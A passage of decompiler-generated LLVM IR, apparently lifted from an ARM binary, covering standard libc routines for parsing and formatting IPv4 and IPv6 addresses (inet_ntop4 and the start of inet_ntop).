  store i32 ptrtoint ([17 x i8]* @global_var_206dc.1227 to i32), i32* %r0.global-to-local, align 4
  %v3_1ab7c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_206dc.1227 to i32), i32 %v0_1ab74)
  %v4_1ab7c = trunc i32 %v3_1ab7c to i8
  store i32 %v3_1ab7c, i32* %r0.global-to-local, align 4
  %v3_1ab80 = icmp eq i8 %v4_1ab7c, 0
  %v0_1ab84 = load i32, i32* @r6, align 4
  %v1_1ab84 = add i32 %v0_1ab84, 1
  store i32 %v1_1ab84, i32* @r6, align 4
  br i1 %v3_1ab80, label %dec_label_pc_1aba0, label %dec_label_pc_1ab8c

dec_label_pc_1ab8c:                               ; preds = %dec_label_pc_1ab70
  %v0_1ab8c = load i32, i32* %sb.global-to-local, align 4
  %v2_1ab8c = sext i8 %v4_1ab7c to i32
  %v3_1ab8c = sub i32 %v2_1ab8c, %v0_1ab8c
  store i32 %v3_1ab8c, i32* %r3.global-to-local, align 4
  %v1_1ab90 = load i32, i32* %r7.global-to-local, align 4
  %v4_1ab90 = mul i32 %v1_1ab90, 16
  %v5_1ab90 = or i32 %v4_1ab90, %v3_1ab8c
  store i32 %v5_1ab90, i32* %r7.global-to-local, align 4
  %v3_1ab98 = icmp ult i32 %v5_1ab90, 65534
  br i1 %v3_1ab98, label %dec_label_pc_1ac34, label %dec_label_pc_1acf0

dec_label_pc_1aba0:                               ; preds = %dec_label_pc_1ab70
  %v0_1aba0 = load i32, i32* @r5, align 4
  %v7_1aba0 = icmp eq i32 %v0_1aba0, 58
  br i1 %v7_1aba0, label %dec_label_pc_1aba8, label %dec_label_pc_1ac04

dec_label_pc_1aba8:                               ; preds = %dec_label_pc_1aba0
  %v4_1aba82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_1aba82, i32* %r3.global-to-local, align 4
  %v2_1abac = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1abac, label %dec_label_pc_1abb4, label %dec_label_pc_1abc8

dec_label_pc_1abb4:                               ; preds = %dec_label_pc_1aba8
  %v0_1abb4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1abb4 = icmp eq i32 %v0_1abb4, 0
  br i1 %v2_1abb4, label %dec_label_pc_1abbc, label %dec_label_pc_1acf0

dec_label_pc_1abbc:                               ; preds = %dec_label_pc_1abb4
  %v0_1abbc = load i32, i32* @r4, align 4
  store i32 %v0_1abbc, i32* %fp.global-to-local, align 4
  store i32 %v1_1ab84, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ac3c.backedge

dec_label_pc_1abc8:                               ; preds = %dec_label_pc_1aba8
  %v1_1abc8 = inttoptr i32 %v1_1ab84 to i8*
  %v2_1abc8 = load i8, i8* %v1_1abc8, align 1
  %v3_1abc8 = zext i8 %v2_1abc8 to i32
  store i32 %v3_1abc8, i32* %r3.global-to-local, align 4
  %v2_1abcc = icmp eq i8 %v2_1abc8, 0
  br i1 %v2_1abcc, label %dec_label_pc_1acf0, label %dec_label_pc_1abd4

dec_label_pc_1abd4:                               ; preds = %dec_label_pc_1abc8
  %v0_1abd4 = load i32, i32* @r4, align 4
  %v1_1abd4 = add i32 %v0_1abd4, 2
  store i32 %v1_1abd4, i32* %r3.global-to-local, align 4
  %v1_1abd8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1abd4, %v1_1abd8
  br i1 %tmp38, label %dec_label_pc_1acf0, label %dec_label_pc_1abe0

dec_label_pc_1abe0:                               ; preds = %dec_label_pc_1abd4
  %v0_1abe0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1abe0 = udiv i32 %v0_1abe0, 256
  store i32 %v3_1abe0, i32* %r2.global-to-local, align 4
  store i32 %v0_1abd4, i32* %r3.global-to-local, align 4
  %v1_1abe8 = trunc i32 %v3_1abe0 to i8
  %v3_1abe8 = inttoptr i32 %v0_1abd4 to i8*
  store i8 %v1_1abe8, i8* %v3_1abe8, align 1
  %v4_1abe8 = load i32, i32* %r3.global-to-local, align 4
  %v5_1abe8 = add i32 %v4_1abe8, 1
  store i32 %v5_1abe8, i32* %r3.global-to-local, align 4
  %v0_1abec = load i32, i32* @r6, align 4
  store i32 %v0_1abec, i32* %sl.global-to-local, align 4
  %v0_1abf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1abf0 = trunc i32 %v0_1abf0 to i8
  %v2_1abf0 = load i32, i32* @r4, align 4
  %v3_1abf0 = add i32 %v2_1abf0, 1
  %v4_1abf0 = inttoptr i32 %v3_1abf0 to i8*
  store i8 %v1_1abf0, i8* %v4_1abf0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1abf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1abf8 = add i32 %v0_1abf8, 1
  store i32 %v1_1abf8, i32* @r4, align 4
  %v0_1ac3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1ac3c.backedge

dec_label_pc_1ac04:                               ; preds = %dec_label_pc_1aba0
  %v7_1ac04 = icmp eq i32 %v0_1aba0, 46
  br i1 %v7_1ac04, label %dec_label_pc_1ac0c, label %dec_label_pc_1acf0

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1ac04
  %v0_1ac0c = load i32, i32* @r4, align 4
  %v1_1ac0c = add i32 %v0_1ac0c, 4
  store i32 %v1_1ac0c, i32* @r5, align 4
  %v1_1ac10 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ac0c, %v1_1ac10
  br i1 %tmp39, label %dec_label_pc_1acf0, label %dec_label_pc_1ac18

dec_label_pc_1ac18:                               ; preds = %dec_label_pc_1ac0c
  %v0_1ac1c = load i32, i32* %sl.global-to-local, align 4
  %v1_1ac1c = inttoptr i32 %v0_1ac1c to i8*
  store i32 %v0_1ac1c, i32* %r0.global-to-local, align 4
  %v4_1ac20 = call i32 @inet_pton4(i8* %v1_1ac1c, i32 %v0_1ac0c)
  store i32 %v4_1ac20, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_1ac20, 1
  br i1 %tmp36, label %dec_label_pc_1acf0, label %bb

bb:                                               ; preds = %dec_label_pc_1ac18
  %v5_1ac28 = load i32, i32* @r5, align 4
  store i32 %v5_1ac28, i32* @r4, align 4
  br label %dec_label_pc_1ac78

dec_label_pc_1ac34:                               ; preds = %dec_label_pc_1ab8c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ac3c.backedge

dec_label_pc_1ac3c.backedge:                      ; preds = %dec_label_pc_1ac34, %dec_label_pc_1abbc, %dec_label_pc_1abe0
  %v0_1ac3c = phi i32 [ %v1_1ab84, %dec_label_pc_1abbc ], [ %v0_1ac3c.pre, %dec_label_pc_1abe0 ], [ %v1_1ab84, %dec_label_pc_1ac34 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1abbc ], [ 0, %dec_label_pc_1abe0 ], [ 1, %dec_label_pc_1ac34 ]
  %v1_1ac3c = inttoptr i32 %v0_1ac3c to i8*
  %v2_1ac3c = load i8, i8* %v1_1ac3c, align 1
  %v3_1ac3c = zext i8 %v2_1ac3c to i32
  store i32 %v3_1ac3c, i32* %r0.global-to-local, align 4
  %v1_1ac40 = call i32 @__GI_tolower(i32 %v3_1ac3c)
  store i32 %v1_1ac40, i32* %r0.global-to-local, align 4
  store i32 %v1_1ac40, i32* @r5, align 4
  %v2_1ac44 = icmp eq i32 %v1_1ac40, 0
  br i1 %v2_1ac44, label %dec_label_pc_1ac4c, label %dec_label_pc_1ab70

dec_label_pc_1ac4c:                               ; preds = %dec_label_pc_1ac3c.backedge, %dec_label_pc_1ab5c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1ab5c ], [ %stack_var_-56.0.be, %dec_label_pc_1ac3c.backedge ]
  %v4_1ac4c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1ac4c3, i32* %r3.global-to-local, align 4
  %v2_1ac50 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1acbc.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_1ac50, label %dec_label_pc_1ac78, label %dec_label_pc_1ac58

dec_label_pc_1ac58:                               ; preds = %dec_label_pc_1ac4c
  %v1_1ac58 = add i32 %v0_1acbc.pre.pre, 2
  store i32 %v1_1ac58, i32* %r3.global-to-local, align 4
  %v1_1ac5c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_1ac58, %v1_1ac5c
  br i1 %tmp40, label %dec_label_pc_1acf0, label %dec_label_pc_1ac64

dec_label_pc_1ac64:                               ; preds = %dec_label_pc_1ac58
  store i32 %v0_1acbc.pre.pre, i32* %r3.global-to-local, align 4
  %v0_1ac68 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ac68 = udiv i32 %v0_1ac68, 256
  store i32 %v3_1ac68, i32* %r2.global-to-local, align 4
  %v1_1ac6c = trunc i32 %v3_1ac68 to i8
  %v3_1ac6c = inttoptr i32 %v0_1acbc.pre.pre to i8*
  store i8 %v1_1ac6c, i8* %v3_1ac6c, align 1
  %v4_1ac6c = load i32, i32* %r3.global-to-local, align 4
  %v5_1ac6c = add i32 %v4_1ac6c, 1
  store i32 %v5_1ac6c, i32* %r3.global-to-local, align 4
  %v0_1ac70 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ac70 = trunc i32 %v0_1ac70 to i8
  %v2_1ac70 = load i32, i32* @r4, align 4
  %v3_1ac70 = add i32 %v2_1ac70, 1
  %v4_1ac70 = inttoptr i32 %v3_1ac70 to i8*
  store i8 %v1_1ac70, i8* %v4_1ac70, align 1
  %v0_1ac74 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac74 = add i32 %v0_1ac74, 1
  store i32 %v1_1ac74, i32* @r4, align 4
  br label %dec_label_pc_1ac78

dec_label_pc_1ac78:                               ; preds = %dec_label_pc_1ac4c, %bb, %dec_label_pc_1ac64
  %v0_1acbc.pre = phi i32 [ %v5_1ac28, %bb ], [ %v1_1ac74, %dec_label_pc_1ac64 ], [ %v0_1acbc.pre.pre, %dec_label_pc_1ac4c ]
  %v0_1ac78 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ac78 = icmp eq i32 %v0_1ac78, 0
  %v1_1acbc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ac78, label %dec_label_pc_1acbc, label %dec_label_pc_1ac80

dec_label_pc_1ac80:                               ; preds = %dec_label_pc_1ac78
  %v9_1ac80 = icmp eq i32 %v0_1acbc.pre, %v1_1acbc.pre
  %v2_1ac84 = sub i32 %v0_1acbc.pre, %v0_1ac78
  store i32 %v2_1ac84, i32* %r0.global-to-local, align 4
  br i1 %v9_1ac80, label %dec_label_pc_1acf0, label %dec_label_pc_1aca4.preheader

dec_label_pc_1aca4.preheader:                     ; preds = %dec_label_pc_1ac80
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aca4

dec_label_pc_1ac94:                               ; preds = %dec_label_pc_1aca4
  %v0_1ac94 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ac94 = add i32 %v0_1ac94, %v2_1aca8
  %v3_1ac94 = inttoptr i32 %v2_1ac94 to i8*
  %v4_1ac94 = load i8, i8* %v3_1ac94, align 1
  %v3_1ac98 = inttoptr i32 %v2_1acac to i8*
  store i8 %v4_1ac94, i8* %v3_1ac98, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1aca0 = load i32, i32* %fp.global-to-local, align 4
  %v3_1aca0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1aca0 = add i32 %v3_1aca0, %v2_1aca0
  %v5_1aca0 = inttoptr i32 %v4_1aca0 to i8*
  store i8 0, i8* %v5_1aca0, align 1
  %v0_1aca4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1aca4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1acac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1aca4

dec_label_pc_1aca4:                               ; preds = %dec_label_pc_1aca4.preheader, %dec_label_pc_1ac94
  %v0_1acb8 = phi i32 [ %v1_1acbc.pre, %dec_label_pc_1aca4.preheader ], [ %v1_1acac.pre, %dec_label_pc_1ac94 ]
  %v1_1aca8 = phi i32 [ %v2_1ac84, %dec_label_pc_1aca4.preheader ], [ %v1_1aca4.pre, %dec_label_pc_1ac94 ]
  %v0_1acb0 = phi i32 [ 1, %dec_label_pc_1aca4.preheader ], [ %v0_1aca4.pre, %dec_label_pc_1ac94 ]
  %v2_1aca8 = sub i32 %v1_1aca8, %v0_1acb0
  store i32 %v2_1aca8, i32* %ip.global-to-local, align 4
  %v2_1acac = sub i32 %v0_1acb8, %v0_1acb0
  store i32 %v2_1acac, i32* @lr, align 4
  %v1_1acb0 = add i32 %v0_1acb0, 1
  store i32 %v1_1acb0, i32* %r2.global-to-local, align 4
  %v7_1acb4 = icmp slt i32 %v1_1aca8, %v0_1acb0
  br i1 %v7_1acb4, label %dec_label_pc_1acb8, label %dec_label_pc_1ac94

dec_label_pc_1acb8:                               ; preds = %dec_label_pc_1aca4
  store i32 %v0_1acb8, i32* @r4, align 4
  br label %dec_label_pc_1acbc

dec_label_pc_1acbc:                               ; preds = %dec_label_pc_1ac78, %dec_label_pc_1acb8
  %v0_1acbc = phi i32 [ %v0_1acb8, %dec_label_pc_1acb8 ], [ %v0_1acbc.pre, %dec_label_pc_1ac78 ]
  %v1_1acbc = phi i32 [ %v0_1acb8, %dec_label_pc_1acb8 ], [ %v1_1acbc.pre, %dec_label_pc_1ac78 ]
  %v9_1acbc = icmp eq i32 %v0_1acbc, %v1_1acbc
  br i1 %v9_1acbc, label %dec_label_pc_1acc4, label %dec_label_pc_1acf0

dec_label_pc_1acc4:                               ; preds = %dec_label_pc_1acbc
  store i32 16, i32* @r2, align 4
  %v2_1acc8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_1acc8, i32* @r0, align 4
  store i32 %v2_1ab2c, i32* @r1, align 4
  %v0_1acd0 = call i32 @memcpy()
  store i32 %v0_1acd0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1acf4

dec_label_pc_1acdc:                               ; preds = %dec_label_pc_1ab0c
  %v0_1acdc = call i32 @__errno_location()
  store i32 %v0_1acdc, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1ace8 = inttoptr i32 %v0_1acdc to i32*
  store i32 97, i32* %v2_1ace8, align 4
  %v0_1acf4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1acf4

dec_label_pc_1acf0:                               ; preds = %dec_label_pc_1ab8c, %dec_label_pc_1abb4, %dec_label_pc_1abd4, %dec_label_pc_1abc8, %dec_label_pc_1ac18, %dec_label_pc_1ac80, %dec_label_pc_1ac04, %dec_label_pc_1acbc, %dec_label_pc_1ab50, %dec_label_pc_1ac58, %dec_label_pc_1ac0c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1acf4

dec_label_pc_1acf4:                               ; preds = %dec_label_pc_1acdc, %dec_label_pc_1acc4, %dec_label_pc_1ab18, %dec_label_pc_1acf0
  %v0_1acf4 = phi i32 [ %v0_1acf4.pre, %dec_label_pc_1acdc ], [ 1, %dec_label_pc_1acc4 ], [ %v4_1ab20, %dec_label_pc_1ab18 ], [ 0, %dec_label_pc_1acf0 ]
  store i32 %v0_1acf4, i32* %r0.global-to-local, align 4
  store i32 %v3_1aaf4, i32* @r4, align 4
  store i32 %v6_1aaf4, i32* @r5, align 4
  store i32 %v9_1aaf4, i32* @r6, align 4
  ret i32 %v0_1acf4

; uselistorder directives
  uselistorder i32 %v0_1acf4, { 1, 0 }
  uselistorder i32 %v2_1acac, { 1, 0 }
  uselistorder i32 %v2_1aca8, { 1, 0 }
  uselistorder i32 %v0_1acb0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1acb8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1acbc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1acbc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1ac68, { 1, 0 }
  uselistorder i32 %v0_1acbc.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ac40, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1ac1c, { 1, 0 }
  uselistorder i32 %v3_1abe0, { 1, 0 }
  uselistorder i32 %v0_1abd4, { 1, 0, 2 }
  uselistorder i32 %v1_1ab84, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1ab7c, { 1, 0 }
  uselistorder i32 %v0_1ab60, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 11, 10, 7, 6, 9, 8, 17, 16, 13, 12, 15, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 5, 6, 7, 8, 26, 27, 24, 25, 22, 23, 21, 19, 20, 18, 15, 16, 17, 12, 13, 10, 11, 1, 2, 14, 9, 28, 29, 30 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_1acf4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1acf0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1acbc, { 1, 0 }
  uselistorder label %dec_label_pc_1aca4, { 1, 0 }
  uselistorder label %dec_label_pc_1ac78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ac3c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ab70, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1ad04 = load i32, i32* @r4, align 4
  store i32 %v3_1ad04, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_206c8.1229 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_1ad20 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1ad20, i32* @r0, align 4
  %v0_1ad24 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_1ad34 = bitcast i32* %stack_var_-51 to i8*
  %v3_1ad34 = call i32 @__GI_memset(i8* %v2_1ad34, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1adfc = ptrtoint i32* %stack_var_-36 to i32
  %v2_1add8 = add i32 %v2_1adfc, -17
  br label %dec_label_pc_1adfc

dec_label_pc_1ad44:                               ; preds = %dec_label_pc_1adfc
  %v0_1ad44 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ad44 = add i32 %v0_1ad44, %v1_1ad44
  %v3_1ad44 = inttoptr i32 %v2_1ad44 to i8*
  %v4_1ad44 = load i8, i8* %v3_1ad44, align 1
  %v6_1ad44 = zext i8 %v4_1ad44 to i32
  store i32 %v6_1ad44, i32* %r4.global-to-local, align 4
  %v1_1ad48 = add i32 %v0_1ad48, 1
  store i32 %v1_1ad48, i32* %r7.global-to-local, align 4
  store i32 %v2_1adfc, i32* %r2.global-to-local, align 4
  %v2_1ad54 = add i32 %v1_1ad48, %v2_1adfc
  store i32 %v2_1ad54, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_1ad44, 100
  %v1_1ad5c = or i8 %div, 48
  %v3_1ad60 = add i32 %v2_1ae0c, -17
  %v4_1ad60 = inttoptr i32 %v3_1ad60 to i8*
  store i8 %v1_1ad5c, i8* %v4_1ad60, align 1
  %v0_1ad64 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ad64 = add i32 %v0_1ad64, -17
  %v2_1ad64 = inttoptr i32 %v1_1ad64 to i8*
  %v3_1ad64 = load i8, i8* %v2_1ad64, align 1
  %v7_1ad68 = icmp eq i8 %v3_1ad64, 48
  %v0_1ad6c = load i32, i32* %fp.global-to-local, align 4
  %v1_1ad6c = load i32, i32* %r8.global-to-local, align 4
  %v2_1ad6c = add i32 %v1_1ad6c, %v0_1ad6c
  store i32 %v2_1ad6c, i32* %sb.global-to-local, align 4
  %v0_1ad74 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ad7c = udiv i32 %v0_1ad74, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1ad84 = urem i32 %v2_1ad7c, 256
  %v2_1ad88 = urem i32 %v1_1ad84, 10
  %v1_1ad8c = or i32 %v2_1ad88, 48
  %v1_1ad90 = trunc i32 %v1_1ad8c to i8
  br i1 %v7_1ad68, label %dec_label_pc_1ad7c, label %dec_label_pc_1ada4

dec_label_pc_1ad7c:                               ; preds = %dec_label_pc_1ad44
  store i8 %v1_1ad90, i8* %v2_1ad64, align 1
  %v0_1ad94 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ad94 = add i32 %v0_1ad94, -17
  %v2_1ad94 = inttoptr i32 %v1_1ad94 to i8*
  %v3_1ad94 = load i8, i8* %v2_1ad94, align 1
  %v7_1ad98 = icmp eq i8 %v3_1ad94, 48
  br i1 %v7_1ad98, label %dec_label_pc_1ad7c.dec_label_pc_1adc8_crit_edge, label %bb

dec_label_pc_1ad7c.dec_label_pc_1adc8_crit_edge:  ; preds = %dec_label_pc_1ad7c
  %v1_1add8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1adc8

bb:                                               ; preds = %dec_label_pc_1ad7c
  %v1_1ad9c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1ad9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1adc8

dec_label_pc_1ada4:                               ; preds = %dec_label_pc_1ad44
  %v2_1adc0 = load i32, i32* %sl.global-to-local, align 4
  %v3_1adc0 = add i32 %v2_1adc0, -17
  %v4_1adc0 = inttoptr i32 %v3_1adc0 to i8*
  store i8 %v1_1ad90, i8* %v4_1adc0, align 1
  %v0_1adc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1adc4 = add i32 %v0_1adc4, 1
  store i32 %v1_1adc4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1adc8

dec_label_pc_1adc8:                               ; preds = %dec_label_pc_1ad7c.dec_label_pc_1adc8_crit_edge, %bb, %dec_label_pc_1ada4
  %v1_1add8 = phi i32 [ %v1_1add8.pre, %dec_label_pc_1ad7c.dec_label_pc_1adc8_crit_edge ], [ %v1_1ad9c, %bb ], [ %v1_1adc4, %dec_label_pc_1ada4 ]
  %v0_1adc8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1adc8 = inttoptr i32 %v0_1adc8 to i8*
  %v2_1adc8 = load i8, i8* %v1_1adc8, align 1
  %tmp17 = urem i8 %v2_1adc8, 10
  store i32 %v2_1adfc, i32* %ip.global-to-local, align 4
  %v1_1addc = add i32 %v1_1add8, 1
  store i32 %v1_1addc, i32* %r1.global-to-local, align 4
  %v1_1ade0 = or i8 %tmp17, 48
  %v3_1ade4 = add i32 %v2_1add8, %v1_1add8
  %v4_1ade4 = inttoptr i32 %v3_1ade4 to i8*
  store i8 %v1_1ade0, i8* %v4_1ade4, align 1
  %v0_1ade8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ade8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ade8 = add i32 %v1_1ade8, %v0_1ade8
  store i32 %v2_1ade8, i32* %r2.global-to-local, align 4
  %v3_1adf0 = add i32 %v2_1ade8, -17
  %v4_1adf0 = inttoptr i32 %v3_1adf0 to i8*
  store i8 46, i8* %v4_1adf0, align 1
  %v0_1adf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1adf4 = add i32 %v0_1adf4, 1
  store i32 %v1_1adf4, i32* %r8.global-to-local, align 4
  %v0_1adf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1adf8 = add i32 %v0_1adf8, 1
  br label %dec_label_pc_1adfc

dec_label_pc_1adfc:                               ; preds = %entry, %dec_label_pc_1adc8
  %v0_1ad48 = phi i32 [ 0, %entry ], [ %v1_1adf8, %dec_label_pc_1adc8 ]
  %v1_1ad44 = phi i32 [ 0, %entry ], [ %v1_1adf4, %dec_label_pc_1adc8 ]
  store i32 %v2_1adfc, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1ad48, i32* %r6.global-to-local, align 4
  %v2_1ae0c = add i32 %v0_1ad48, %v2_1adfc
  store i32 %v2_1ae0c, i32* %r5.global-to-local, align 4
  %v7_1ae10 = icmp sgt i32 %v1_1ad44, 3
  br i1 %v7_1ae10, label %dec_label_pc_1ae14, label %dec_label_pc_1ad44

dec_label_pc_1ae14:                               ; preds = %dec_label_pc_1adfc
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1ad20, i32* %r4.global-to-local, align 4
  %v3_1ae1c = add i32 %v2_1ae0c, -18
  %v4_1ae1c = inttoptr i32 %v3_1ae1c to i8*
  store i8 0, i8* %v4_1ae1c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1ae24 = call i32 @strlen(i8* %tmp18)
  %v2_1ae28 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_1ae24, %v2_1ae28
  br i1 %tmp, label %dec_label_pc_1ae34, label %dec_label_pc_1ae48

dec_label_pc_1ae34:                               ; preds = %dec_label_pc_1ae14
  %v0_1ae34 = call i32 @__errno_location()
  %v0_1ae3c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1ae3c, i32* %r2.global-to-local, align 4
  %v2_1ae40 = inttoptr i32 %v0_1ae34 to i32*
  store i32 28, i32* %v2_1ae40, align 4
  %v0_1ae58.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae58

dec_label_pc_1ae48:                               ; preds = %dec_label_pc_1ae14
  store i32 %v2_1ad20, i32* %r1.global-to-local, align 4
  %v3_1ae50 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_1ae50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae58

dec_label_pc_1ae58:                               ; preds = %dec_label_pc_1ae34, %dec_label_pc_1ae48
  %v0_1ae58 = phi i32 [ %v0_1ae58.pre, %dec_label_pc_1ae34 ], [ %v3_1ae50, %dec_label_pc_1ae48 ]
  %v2_1ae60 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1ae60, i32* @r4, align 4
  ret i32 %v0_1ae58

; uselistorder directives
  uselistorder i32 %v2_1ae0c, { 0, 2, 1 }
  uselistorder i32 %v1_1ad44, { 1, 0 }
  uselistorder i32 %v0_1ad48, { 0, 2, 1 }
  uselistorder i32 %v2_1adfc, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1ae58, { 1, 0 }
  uselistorder label %dec_label_pc_1adfc, { 1, 0 }
  uselistorder label %dec_label_pc_1adc8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1ae68 = load i32, i32* @r4, align 4
  store i32 %v3_1ae68, i32* %stack_var_-32, align 4
